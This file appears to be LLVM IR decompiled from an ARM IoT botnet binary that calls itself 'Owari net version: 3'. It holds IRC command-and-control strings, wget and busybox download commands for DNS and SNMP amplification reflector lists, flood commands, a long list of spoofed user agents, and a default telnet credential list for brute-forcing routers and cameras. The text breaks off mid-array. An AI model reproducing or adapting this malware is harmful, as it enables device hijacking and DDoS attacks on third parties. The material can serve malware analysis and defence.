source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_448fc.27 = global i32 0
@global_var_36a88.33 = constant [6 x i8] c"ARM4T\00"
@global_var_52598.39 = global i32 0
@global_var_36a90.41 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_49b48.43 = local_unnamed_addr global i32 0
@global_var_53718.45 = global i32 0
@global_var_49b44.49 = global i32 0
@global_var_36ab0.51 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_5258c.53 = global i32 0
@global_var_36af0.55 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_36b0c.57 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_36b30.59 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_36b58.61 = constant [8 x i8] c"http://\00"
@global_var_36b60.63 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_36b88.65 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_36bb0.67 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_36cc4.69 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_36ce0.71 = constant [3 x i8] c"wb\00"
@global_var_36ce4.73 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_36cec.75 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_36d04.79 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_36d24.81 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_36d54.83 = constant [70 x i8] c"NOTICE %s :Owari net version: 3 by Kuze-senpai, Milenko and Morpheus\0A\00"
@global_var_36d9c.85 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_36db4.87 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_52594.89 = global i32 0
@global_var_36dec.91 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_36df8.94 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_36e08.96 = constant [8 x i8] c"GIGANET\00"
@global_var_36e10.98 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_36e2c.101 = constant [9 x i8] c"Disabled\00"
@global_var_36e38.103 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_36e54.105 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_36e78.107 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_36e98.109 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_52488.111 = global i32 0
@global_var_36ec0.113 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_36ee0.115 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_36efc.121 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_36f1c.124 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_36f38.126 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_36f58.128 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_36f78.132 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_36fc4.134 = constant [3 x i8] c".0\00"
@global_var_49f4c.136 = global i32 0
@global_var_36fc8.139 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_36fec.141 = constant i32 46
@global_var_49f5c.143 = global i32 0
@global_var_49f60.144 = local_unnamed_addr global i32 0
@global_var_49f64.145 = local_unnamed_addr global i32 0
@global_var_45358.148 = local_unnamed_addr global i32 4095
@global_var_45354.151 = global i32 362436
@global_var_36ff0.153 = constant [14 x i8] c"192.168.3.100\00"
@global_var_536c4.157 = global i32 0
@global_var_37020.160 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_37064.162 = constant [171 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt || /var/run/busybox wget \22%s\22 -O DNS.txt\00"
@global_var_37110.166 = constant [8 x i8] c"DNS.txt\00"
@1 = constant i32 114
@global_var_3711c.170 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_37140.172 = constant i32 1124073541
@global_var_37184.174 = constant [13 x i8] c"192.168.1.83\00"
@global_var_526bc.176 = global i32 0
@global_var_52590.178 = global i32 0
@global_var_4535c.180 = global i32 83
@global_var_37194.182 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_371f8.184 = constant [176 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt || /var/run/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_372a8.189 = constant [9 x i8] c"SNMP.txt\00"
@global_var_372b4.192 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_372dc.195 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_35760.198 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_357ac.199 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_35800.200 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_35858.201 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_358b0.202 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_358f0.203 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_35938.204 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_35990.205 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_359fc.206 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_35a54.207 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_35aa4.208 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_35ac8.209 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_35b24.210 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_35b34.211 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_35b64.212 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_35b88.213 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_35bac.214 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_35bc8.215 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_35c08.216 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_35c58.217 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_35ca4.218 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_35ce0.219 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_35d3c.220 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_35da4.221 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_35e18.222 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_35e90.223 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_35eec.224 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_35f40.225 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_35fc8.226 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_3601c.227 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_36084.228 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_360e0.229 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_36130.230 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_36174.231 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_361c8.232 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_36214.233 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_36258.234 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_362ac.235 = constant [123 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6\00"
@global_var_36328.236 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_36394.237 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_36404.238 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_36460.239 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_364d4.240 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_36544.241 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_365dc.242 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_36628.243 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_36690.244 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_366cc.245 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_366fc.246 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_3673c.247 = constant [5 x i8] c"root\00"
@global_var_36744.248 = constant [6 x i8] c"admin\00"
@global_var_3674c.249 = constant [6 x i8] c"guest\00"
@global_var_36754.250 = constant [8 x i8] c"default\00"
@global_var_36760.251 = constant [5 x i8] c"user\00"
@global_var_36768.252 = constant [7 x i8] c"daemon\00"
@global_var_36770.253 = constant [4 x i8] c"adm\00"
@global_var_36778.254 = constant [7 x i8] c"telnet\00"
@global_var_36780.255 = constant [14 x i8] c"Administrator\00"
@global_var_36790.256 = constant [7 x i8] c"mg3500\00"
@global_var_36798.257 = constant [7 x i8] c"admin1\00"
@global_var_367a0.258 = constant [5 x i8] c"ubnt\00"
@global_var_367a8.259 = constant [8 x i8] c"support\00"
@global_var_367b4.260 = constant i32 0
@global_var_367b8.261 = constant [7 x i8] c"000000\00"
@global_var_367c0.262 = constant [6 x i8] c"14567\00"
@global_var_367c8.263 = constant [7 x i8] c"hi3518\00"
@global_var_367d0.264 = constant [5 x i8] c"pass\00"
@global_var_367d8.265 = constant [8 x i8] c"admin14\00"
@global_var_367e4.266 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_367f4.267 = constant [9 x i8] c"00000000\00"
@global_var_36800.268 = constant [3 x i8] c"<>\00"
@global_var_36804.269 = constant [5 x i8] c"klv1\00"
@global_var_3680c.270 = constant [6 x i8] c"klv14\00"
@global_var_36814.271 = constant [9 x i8] c"oelinux1\00"
@global_var_36820.272 = constant [8 x i8] c"realtek\00"
@global_var_3682c.273 = constant [5 x i8] c"1111\00"
@global_var_36834.274 = constant [6 x i8] c"54321\00"
@global_var_3683c.275 = constant [7 x i8] c"antslq\00"
@global_var_36844.276 = constant [8 x i8] c"zte9x15\00"
@global_var_36850.277 = constant [7 x i8] c"system\00"
@global_var_36858.278 = constant [5 x i8] c"1456\00"
@global_var_36860.279 = constant [7 x i8] c"888888\00"
@global_var_36868.280 = constant [5 x i8] c"ikwb\00"
@global_var_36870.281 = constant [9 x i8] c"password\00"
@global_var_3687c.282 = constant [9 x i8] c"juantech\00"
@global_var_36888.283 = constant [7 x i8] c"Zte521\00"
@global_var_36890.284 = constant [7 x i8] c"xc3511\00"
@global_var_36898.285 = constant [8 x i8] c"1111111\00"
@global_var_368a4.286 = constant [8 x i8] c"service\00"
@global_var_368b0.287 = constant [4 x i8] c"145\00"
@global_var_368b8.288 = constant [5 x i8] c"4321\00"
@global_var_368c0.289 = constant [5 x i8] c"tech\00"
@global_var_368c8.290 = constant [5 x i8] c"abc1\00"
@global_var_368d0.291 = constant [7 x i8] c"switch\00"
@global_var_368d8.292 = constant [7 x i8] c"meinsm\00"
@global_var_368e0.293 = constant [9 x i8] c"smcadmin\00"
@global_var_368ec.294 = constant [9 x i8] c"14567890\00"
@global_var_368f8.295 = constant [3 x i8] c"14\00"
@global_var_368fc.296 = constant [5 x i8] c"anko\00"
@global_var_36904.297 = constant [7 x i8] c"merlin\00"
@global_var_3690c.298 = constant [6 x i8] c"zlxx.\00"
@global_var_36914.299 = constant [11 x i8] c"supervisor\00"
@global_var_36920.300 = constant [14 x i8] c"administrator\00"
@global_var_36930.301 = constant [7 x i8] c"666666\00"
@global_var_36938.302 = constant [8 x i8] c"klv1234\00"
@global_var_36944.303 = constant [6 x i8] c"jvbzd\00"
@global_var_3694c.304 = constant [5 x i8] c"zlxx\00"
@global_var_36954.305 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_36964.306 = constant [9 x i8] c"dreambox\00"
@global_var_36970.307 = constant [5 x i8] c"1234\00"
@global_var_36978.308 = constant [6 x i8] c"12345\00"
@global_var_36980.309 = constant [7 x i8] c"123456\00"
@global_var_36988.310 = constant [7 x i8] c"fucker\00"
@global_var_36990.311 = constant [6 x i8] c"vizxv\00"
@global_var_36998.312 = constant [8 x i8] c"xmhdipc\00"
@global_var_369a4.313 = constant [10 x i8] c"admin1234\00"
@global_var_369b0.314 = constant [7 x i8] c"klv123\00"
@global_var_369b8.315 = constant [7 x i8] c"/tmp/*\00"
@global_var_369c0.316 = constant [7 x i8] c"/var/*\00"
@global_var_369c8.317 = constant [11 x i8] c"/var/run/*\00"
@global_var_369d4.318 = constant [11 x i8] c"/var/tmp/*\00"
@global_var_44cb8.319 = global [377 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_35760.198, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_357ac.199, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_35800.200, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_35858.201, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_358b0.202, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_358f0.203, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_35938.204, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_35990.205, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_359fc.206, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_35a54.207, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_35aa4.208, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_35ac8.209, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_35b24.210, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_35b34.211, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_35b64.212, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_35b88.213, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_35bac.214, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_35bc8.215, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_35c08.216, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_35c58.217, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @global_var_35ca4.218, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @global_var_35ce0.219, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_35d3c.220, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_35da4.221, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_35e18.222, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_35e90.223, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_35eec.224, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_35f40.225, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_35fc8.226, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_3601c.227, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_36084.228, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_360e0.229, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_36130.230, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_36174.231, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_361c8.232, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_36214.233, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_36258.234, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_362ac.235, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_36328.236, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_36394.237, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_36404.238, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_36460.239, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_364d4.240, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_36544.241, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_365dc.242, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_36628.243, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @global_var_36690.244, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_366cc.245, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_366fc.246, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36768.252, i32 0, 